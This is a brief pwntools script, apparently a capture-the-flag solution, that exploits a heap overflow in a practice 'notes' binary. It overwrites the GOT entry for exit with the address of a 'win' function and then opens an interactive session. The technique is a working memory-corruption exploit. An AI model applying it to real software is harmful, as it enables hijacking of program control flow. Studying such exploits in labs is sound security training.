from pwn import *
elf = context.binary = ELF("./notes")
r = elf.process()
gdb.attach(r, '''
    b* main+313\n
    b* edit\n
    c
''')
def add(index):
    r.sendline(str(1))
    r.sendline(str(index))
    r.sendline(b"AA")

def edit(index, payload:bytes):
    r.sendline(str(2))
    r.sendline(str(index))
    r.sendline(payload)

add(0)
add(1)
payload = b"A" * 0x20 + p64(elf.got["exit"])
edit(0, payload)
edit(1, p64(elf.sym.win))
r.sendline(str(0))
r.interactive()